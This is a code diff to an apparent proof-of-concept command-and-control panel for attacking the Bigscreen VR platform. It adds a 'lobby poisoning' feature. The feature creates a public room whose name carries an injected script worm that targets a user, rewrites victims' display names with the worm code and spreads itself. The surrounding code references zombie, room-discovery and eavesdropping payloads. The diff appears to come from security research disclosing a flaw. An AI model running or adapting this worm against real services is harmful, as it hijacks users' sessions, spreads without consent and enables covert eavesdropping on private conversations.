@@ -149,11 +149,24 @@
             <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
             <h2>Command and control panel: Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
         </div>
-        <div class="col-12">
+        <div class="col-6">
+            <form class="form-inline justify-content-center" id="infectLobbyForm">
+                <div class="form-group">
+                    <label for="targetUser" class="my-2">Target user: </label>
+                    <input class="form-control m-2" name="targetUser" id="targetUser" value="Bob" type="text" placeholder="Bob" disabled>
+                </div>
+                <div class="form-group form-check">
+                    <input class="form-check-input my-2 ml-3" type="checkbox" value="" id="worm" checked>
+                    <label class="form-check-label m-2" for="worm">Worm</label>
+                </div>
+                <input class="btn btn-danger m-2" type="submit" value="Start poisoning lobby">
+            </form>
+        </div>
+        <div class="col-6">
             <form class="form-inline justify-content-center" id="joinRoomForm">
-                <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
-                <input class="mb-2 mr-sm-2 form-control" name="roomId" id="roomIdInput" type="text" placeholder="room-8we1jdc4" required>
-                <input class="btn btn-primary mb-2 mr-sm-2" type="submit" value="Eavesdrop as invisible user">
+                <label class="m-2" for="roomIdInput">Room ID: </label>
+                <input class="m-2 form-control" name="roomId" id="roomIdInput" type="text" placeholder="room-8we1jdc4" required>
+                <input class="btn btn-primary m-2" type="submit" value="Eavesdrop as invisible user">
             </form>
         </div>
     </div>
@@ -254,6 +267,7 @@ const webRtcConfig = {
 
 // region GUI bindings
 const joinRoomForm = document.getElementById('joinRoomForm');
+const infectLobbyForm = document.getElementById('infectLobbyForm');
 const roomsElement = document.getElementById('rooms');
 const roomIdInput = document.getElementById('roomIdInput');
 //endregion
@@ -670,6 +684,196 @@ NAME += makeZombie;
 NAME += discoverRoom;
 NAME += persistentLogsEavesdropping;
 NAME += '</sc'+'ript>';
+
+let lobbyPoisoner = null;
+function LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped){
+    // TODO: form fields `worm` and `targetUser` are currently ignored, worm=true, targetUser='Bob'
+    let that = this;
+    this.signalingWs = null;
+    this.onStarted = onStarted;
+    this.onStopped = onStopped;
+    this.state = 'new';
+
+    this.roomId = null;
+    this.roomName = roomName;
+    this.roomDescription = 'Just my own room.';
+    this.attackerIdentity = attackerIdentity;
+
+    this.start = function(){
+        this.state = 'starting';
+        this.createPublicRoom();
+    };
+    this.stop = function(){
+        this.leaveRoom();
+        this.state = 'stopped';
+        this.onStopped();
+        console.info('LobbyPoisoner: Stopped infecting lobby.');
+    };
+
+    this.createPublicRoom = function(){
+        this.signalingWs = new WebSocket(bigscreenSignalUrl);
+        this.signalingWs.binaryType = 'arraybuffer';
+        this.signalingWs.onopen = function (event) {
+            console.debug('LobbyPoisoner connected', event);
+            that.sendSignalingMessage({type: 'register-desktop'});
+            console.debug('LobbyPoisoner registered');
+
+            that.sendSignalingMessage({
+                'type': "room-create",
+                'name': that.roomName,
+                'description': that.roomDescription,
+                'isPrivate': false,
+                'category': "Chat",
+                'creatorName': that.attackerIdentity.name,
+                'creatorUuid': that.attackerIdentity.uuid,
+                'environment': "Cinema",
+                'version': "0.34.0",
+                'size': 12,
+                'roomType': "bigroom"
+              });
+            console.debug('LobbyPoisoner requested to create room');
+        };
+        this.signalingWs.onclose = function (event) {
+            console.debug('LobbyPoisoner onClose disconnected', event);
+        };
+        this.signalingWs.onmessage = function (event) {
+            that.onSignalingMessage(event);
+        };
+        this.signalingWs.onerror = function (event) {
+            console.error('LobbyPoisoner onError event', event);
+        };
+    };
+
+    this.sendSignalingMessage = function(message) {
+        console.debug('sendSignalingMessage', message);
+        this.signalingWs.send(msgpack.encode(message));
+    };
+
+    this.joinRoom = function(){
+        that.sendSignalingMessage({
+          'type': "room-join",
+          'roomId': that.roomId,
+          'name': that.attackerIdentity.name,
+          'uuid': that.attackerIdentity.uuid,
+          'version': unityVersion,
+          'steamId': that.attackerIdentity.steamId,
+          'oculusId': that.attackerIdentity.oculusId
+        });
+        console.debug('LobbyPoisoner requested to join room', that.roomId);
+    };
+
+    this.leaveRoom = function(){
+        this.state = 'leaving';
+        this.sendSignalingMessage({type: "room-leave"});
+        this.signalingWs.close();
+        this.signalingWs = null;
+    };
+
+    this.onSignalingMessage = function(event) {
+        let message = msgpack.decode(new Uint8Array(event.data));
+        console.debug('LobbyPoisoner.onSignalingMessage()', message);
+
+        switch (message.type) {
+            case "room-created":
+                this.roomId = message.roomId;
+                console.info('LobbyPoisoner: room created', this.roomId);
+                this.joinRoom();
+                break;
+
+            case "user-left":
+                console.debug(`LobbyPoisoner: Participant ${message.userId} left room ${this.roomId}.`);
+                break;
+
+            case "user-joined":
+                if(message.uuid === this.attackerIdentity.uuid){
+                    this.attackerIdentity.userId = message.userId;
+                    console.debug('LobbyPoisoner: set attackerIdentity.userId', this.attackerIdentity.userId);
+                    console.debug('LobbyPoisoner: user ready');
+
+                    this.sendSignalingMessage({
+                        type: "user-ready",
+                        roomId: this.roomId,
+                        userId: this.attackerIdentity.userId
+                    });
+
+                    this.state = 'started';
+                    this.onStarted();
+
+                    console.info('LobbyPoisoner: Started infecting lobby.');
+                }
+                else{
+                    console.debug(`LobbyPoisoner: Participant ${message.userId} joined room ${this.roomId}.`);
+                }
+                break;
+
+            case "admin":
+            case "room-latest":
+            case "linkedpc-joined":
+            case "linkedpc-left":
+            case "party-join":
+            case "user-ready":
+            case "room-join-fail":
+            case "room-environment":
+            case "room-private":
+            case "room-public":
+            case "events":
+            case "server-time":
+            case 'ice':
+            case 'offer':
+            case 'answer':
+                console.debug('received message ignored', message);
+                break;
+
+            default:
+                console.error('Unexpected message type (server to client):', message);
+                break;
+        }
+    };
+
+}
+
+infectLobbyForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+    let submitElement = infectLobbyForm.querySelector('input[type=submit]');
+    if (lobbyPoisoner === null) {
+        submitElement.disabled = true;
+        submitElement.classList.add('disabled');
+
+        let roomName = 'My room.';
+        roomName += '<scr'+'ipt>';
+        roomName += `if(NAME==='Bob'){`;
+        roomName += `function worm(){if(window._infected===undefined){var oldName=NAME;`;
+        roomName += discoverRoom;
+        roomName += `displayDefaultState = function () { $("#room-id-info") ["hide"](); $("#room-disconnected") ["hide"](); $("#room-leave") ["show"](); $(".user-you .multiplayer-profile-image") ["removeClass"]("") ["addClass"]("profile-photo-sm multiplayer-profile-image " + USER); $(".user-you .user-name") ["text"](oldName); generateFlairs(USER, $(".user-you .flairs"), $(".user-you .user-name")); $("ul#room-participants") ["html"]("") };`;
+        roomName += `;NAME='<sc'+'ript> '+worm.toString()+' ;worm();</sc'+'ript>'+oldName;Unity.setName(NAME);window._infected=true;}}; worm();`;
+        roomName += '}';
+        roomName += '</sc'+'ript>';
+
+        let onStarted = function () {
+            console.info('LobbyPoisoner: started.');
+            submitElement.value = 'Stop poisoning lobby';
+            submitElement.classList.toggle('btn-danger');
+            submitElement.classList.toggle('btn-success');
+            submitElement.classList.remove('disabled');
+            submitElement.disabled = false;
+        };
+        let onStopped = function () {
+            console.info('LobbyPoisoner: stopped.');
+            submitElement.value = 'Start poisoning lobby';
+            submitElement.classList.toggle('btn-danger');
+            submitElement.classList.toggle('btn-success');
+            submitElement.classList.remove('disabled');
+            submitElement.disabled = false;
+        };
+        let attackerIdentity = new Identity('John46_1', generateBigscreenUuid(), '', '');
+        lobbyPoisoner = new LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped);
+        lobbyPoisoner.start();
+    }
+    else{
+        lobbyPoisoner.stop();
+        lobbyPoisoner = null;
+    }
+});
 
 joinRoomForm.addEventListener("submit", function (event) {
     event.preventDefault();
